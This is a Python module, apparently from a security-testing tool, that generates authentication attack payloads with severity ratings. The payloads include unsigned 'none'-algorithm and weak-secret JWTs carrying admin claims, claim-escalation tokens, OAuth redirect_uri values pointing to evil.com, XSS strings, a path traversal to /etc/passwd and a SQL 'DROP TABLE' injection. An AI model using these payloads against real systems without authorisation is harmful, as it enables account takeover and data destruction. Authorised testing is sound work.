"""
Authentication Attack Patterns
JWT, OAuth, API Key, and Bearer Token attacks
"""

import jwt
import time
from typing import Dict, List, Any
import json
from colorama import Fore, Style
import logging

logger = logging.getLogger(__name__)


class AuthAttackGenerator:
    """
    Generate authentication-specific attack patterns
    """
    
    def __init__(self):
        self.jwt_attacks = []
        self.oauth_attacks = []
        self.api_key_attacks = []
    
    def generate_jwt_attacks(self, sample_token: str = None) -> List[Dict[str, Any]]:
        """
        Generate JWT-specific attacks
        
        Args:
            sample_token: Optional valid JWT token to analyze
        """
        attacks = []
        
        # Attack 1: Algorithm confusion (none algorithm)
        attacks.append({
            'attack_type': 'JWT Algorithm Confusion',
            'severity': 'CRITICAL',
            'description': 'Try to bypass signature verification using "none" algorithm',
            'payloads': self._generate_none_algorithm_tokens(),
        })
        
        # Attack 2: Weak secret brute force
        attacks.append({
            'attack_type': 'JWT Weak Secret',
            'severity': 'HIGH',
            'description': 'Test common weak secrets',
            'payloads': self._generate_weak_secret_tokens(),
        })
        
        # Attack 3: Token expiration bypass
        attacks.append({
            'attack_type': 'JWT Expiration Bypass',
            'severity': 'HIGH',
            'description': 'Test if expired tokens are accepted',
            'payloads': self._generate_expired_tokens(),
        })
        
        # Attack 4: Invalid signature
        attacks.append({
            'attack_type': 'JWT Invalid Signature',
            'severity': 'MEDIUM',
            'description': 'Test if signature validation is enforced',
            'payloads': self._generate_invalid_signature_tokens(),
        })
        
        # Attack 5: Claim manipulation
        attacks.append({
            'attack_type': 'JWT Claim Manipulation',
            'severity': 'CRITICAL',
            'description': 'Modify claims (role, user_id, permissions)',
            'payloads': self._generate_claim_manipulation_tokens(),
        })
        
        # Attack 6: Key confusion (RS256 to HS256)
        attacks.append({
            'attack_type': 'JWT Key Confusion',
            'severity': 'CRITICAL',
            'description': 'Try to sign token with public key as HMAC secret',
            'payloads': self._generate_key_confusion_tokens(),
        })
        
        # Attack 7: Null/Empty token
        attacks.append({
            'attack_type': 'JWT Null Token',
            'severity': 'MEDIUM',
            'description': 'Test handling of null/empty tokens',
            'payloads': ['', None, 'null', 'undefined', 'Bearer ', 'Bearer null'],
        })
        
        # Attack 8: Malformed tokens
        attacks.append({
            'attack_type': 'JWT Malformed',
            'severity': 'LOW',
            'description': 'Send malformed JWT structure',
            'payloads': [
                'not.a.jwt',
                'eyJhbGciOiJub25lIn0',  # Only header
                'eyJhbGciOiJub25lIn0.',  # Header with empty payload
                'a.b',  # Too few parts
                'a.b.c.d',  # Too many parts
                '../../../etc/passwd',  # Path traversal
                "'; DROP TABLE tokens--",  # SQL injection
            ],
        })
        
        return attacks
    
    def _generate_none_algorithm_tokens(self) -> List[str]:
        """Generate tokens with 'none' algorithm"""
        tokens = []
        
        # Standard payload with admin claims
        payloads_to_test = [
            {'user_id': 1, 'role': 'admin', 'exp': int(time.time()) + 3600},
            {'user_id': 1, 'role': 'superuser', 'is_admin': True},
            {'sub': 'admin', 'role': 'administrator'},
        ]
        
        for payload in payloads_to_test:
            # Algorithm: none (case variations)
            for alg in ['none', 'None', 'NONE', 'nOnE']:
                try:
                    # Create token with none algorithm
                    token = jwt.encode(
                        payload,
                        '',  # Empty key
                        algorithm='none'
                    )
                    tokens.append(token)
                except:
                    # Manually craft if library blocks it
                    import base64
                    header = base64.urlsafe_b64encode(
                        json.dumps({'alg': alg, 'typ': 'JWT'}).encode()
                    ).decode().rstrip('=')
                    payload_b64 = base64.urlsafe_b64encode(
                        json.dumps(payload).encode()
                    ).decode().rstrip('=')
                    # Token without signature
                    tokens.append(f"{header}.{payload_b64}.")
                    tokens.append(f"{header}.{payload_b64}")  # Also try without trailing dot
        
        return tokens
    
    def _generate_weak_secret_tokens(self) -> List[str]:
        """Generate tokens signed with common weak secrets"""
        tokens = []
        weak_secrets = [
            'secret',
            'password',
            '123456',
            'qwerty',
            'admin',
            'root',
            'test',
            'changeme',
            'default',
            'jwt_secret',
        ]
        
        payload = {'user_id': 1, 'role': 'admin', 'exp': int(time.time()) + 3600}
        
        for secret in weak_secrets:
            try:
                token = jwt.encode(payload, secret, algorithm='HS256')
                tokens.append(token)
            except Exception as e:
                logger.debug(f"Could not generate token with secret '{secret}': {e}")
        
        return tokens
    
    def _generate_expired_tokens(self) -> List[str]:
        """Generate expired tokens"""
        tokens = []
        
        # Expired by various amounts
        expirations = [
            int(time.time()) - 3600,  # 1 hour ago
            int(time.time()) - 86400,  # 1 day ago
            int(time.time()) - 1,  # 1 second ago
            0,  # Epoch
        ]
        
        for exp in expirations:
            payload = {'user_id': 1, 'role': 'admin', 'exp': exp}
            try:
                token = jwt.encode(payload, 'secret', algorithm='HS256')
                tokens.append(token)
            except:
                pass
        
        return tokens
    
    def _generate_invalid_signature_tokens(self) -> List[str]:
        """Generate tokens with invalid signatures"""
        tokens = []
        
        payload = {'user_id': 1, 'role': 'admin', 'exp': int(time.time()) + 3600}
        
        # Valid token signed with correct secret
        valid_token = jwt.encode(payload, 'correct_secret', algorithm='HS256')
        
        # Tamper with signature
        parts = valid_token.split('.')
        if len(parts) == 3:
            # Flip some bits in signature
            tokens.append(f"{parts[0]}.{parts[1]}.INVALID")
            tokens.append(f"{parts[0]}.{parts[1]}.{parts[2][:-5]}AAAAA")
            tokens.append(f"{parts[0]}.{parts[1]}.")  # Empty signature
        
        return tokens
    
    def _generate_claim_manipulation_tokens(self) -> List[str]:
        """Generate tokens with manipulated claims"""
        tokens = []
        
        # Dangerous claim manipulations
        dangerous_payloads = [
            {'user_id': 1, 'role': 'admin'},
            {'user_id': 1, 'role': 'superuser'},
            {'user_id': 0, 'role': 'admin'},  # Often system user
            {'user_id': -1, 'role': 'admin'},
            {'user_id': 999999, 'role': 'admin'},
            {'sub': 'admin', 'admin': True},
            {'is_admin': True, 'is_superuser': True},
            {'permissions': ['*']},
            {'scope': 'admin:*'},
        ]
        
        for payload in dangerous_payloads:
            try:
                token = jwt.encode(payload, 'secret', algorithm='HS256')
                tokens.append(token)
            except:
                pass
        
        return tokens
    
    def _generate_key_confusion_tokens(self) -> List[str]:
        """Generate tokens exploiting RS256->HS256 confusion"""
        # This attack works when:
        # 1. Server uses RSA public key for RS256
        # 2. Attacker signs token with HS256 using the public key as secret
        # Note: This is complex and requires the public key
        # For demo, we just return example tokens
        
        tokens = []
        payload = {'user_id': 1, 'role': 'admin', 'exp': int(time.time()) + 3600}
        
        # Placeholder - in real scenario you'd use actual public key
        try:
            token = jwt.encode(payload, 'PUBLIC_KEY_PLACEHOLDER', algorithm='HS256')
            tokens.append(token)
        except:
            pass
        
        return tokens
    
    def generate_oauth_attacks(self) -> List[Dict[str, Any]]:
        """Generate OAuth-specific attacks"""
        attacks = []
        
        # Attack 1: Authorization code theft
        attacks.append({
            'attack_type': 'OAuth Code Theft',
            'severity': 'CRITICAL',
            'description': 'Test if authorization codes can be reused or intercepted',
            'test_actions': [
                'Reuse same auth code multiple times',
                'Use auth code without PKCE verifier',
                'Intercept redirect_uri',
            ],
        })
        
        # Attack 2: Redirect URI manipulation
        attacks.append({
            'attack_type': 'OAuth Redirect URI Manipulation',
            'severity': 'CRITICAL',
            'description': 'Test redirect_uri validation',
            'payloads': [
                'http://evil.com',
                'http://localhost',
                'https://legitimate.com.evil.com',
                'https://legitimate.com@evil.com',
                'https://legitimate.com#evil.com',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
            ],
        })
        
        # Attack 3: Scope escalation
        attacks.append({
            'attack_type': 'OAuth Scope Escalation',
            'severity': 'HIGH',
            'description': 'Request unauthorized scopes',
            'payloads': [
                'admin',
                'read write delete',
                '*',
                'user:* repo:*',
            ],
        })
        
        # Attack 4: State parameter bypass
        attacks.append({
            'attack_type': 'OAuth CSRF (State Bypass)',
            'severity': 'HIGH',
            'description': 'Test if state parameter is validated',
            'test_actions': [
                'Omit state parameter',
                'Use predictable state value',
                'Reuse state value',
            ],
        })
        
        return attacks
    
    def generate_api_key_attacks(self) -> List[Dict[str, Any]]:
        """Generate API key attacks"""
        attacks = []
        
        # Attack 1: Missing API key
        attacks.append({
            'attack_type': 'Missing API Key',
            'severity': 'MEDIUM',
            'description': 'Test if endpoints require API key',
            'payloads': [None, '', 'null'],
        })
        
        # Attack 2: Weak/predictable keys
        attacks.append({
            'attack_type': 'Weak API Key',
            'severity': 'HIGH',
            'description': 'Test common/weak API keys',
            'payloads': [
                'test',
                'admin',
                '12345',
                'api_key',
                'key',
                'secret',
                'password',
            ],
        })
        
        # Attack 3: Key enumeration
        attacks.append({
            'attack_type': 'API Key Enumeration',
            'severity': 'MEDIUM',
            'description': 'Test if valid keys can be enumerated',
            'test_actions': [
                'Sequential keys: key_001, key_002, ...',
                'Time-based patterns',
                'Brute force short keys',
            ],
        })
        
        return attacks
    
    def print_auth_attack_summary(self, jwt_attacks, oauth_attacks, api_key_attacks):
        """Print summary of auth attacks"""
        total = len(jwt_attacks) + len(oauth_attacks) + len(api_key_attacks)
        
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"AUTHENTICATION ATTACK PATTERNS")
        print(f"{'='*70}{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Total Attack Categories:{Style.RESET_ALL} {total}\n")
        
        print(f"{Fore.GREEN}JWT Attacks:{Style.RESET_ALL} {len(jwt_attacks)}")
        for attack in jwt_attacks:
            print(f"  • {attack['attack_type']} ({attack['severity']})")
        
        print(f"\n{Fore.GREEN}OAuth Attacks:{Style.RESET_ALL} {len(oauth_attacks)}")
        for attack in oauth_attacks:
            print(f"  • {attack['attack_type']} ({attack['severity']})")
        
        print(f"\n{Fore.GREEN}API Key Attacks:{Style.RESET_ALL} {len(api_key_attacks)}")
        for attack in api_key_attacks:
            print(f"  • {attack['attack_type']} ({attack['severity']})")
        
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")